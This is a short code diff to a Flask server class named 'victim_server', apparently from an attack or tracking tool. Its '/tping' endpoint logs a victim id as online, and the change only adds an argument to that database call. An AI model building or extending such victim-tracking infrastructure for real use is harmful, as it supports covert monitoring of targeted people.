@@ -97,5 +97,5 @@ class victim_server(object):
     @app.route("/tping", methods=["POST"])
     def receivePing():
         vrequest = request.form['id']
-        db.sentences_victim('report_online', [vrequest])
+        db.sentences_victim('report_online', [vrequest], 2)
         return json.dumps({'status' : 'OK', 'vId' : vrequest});
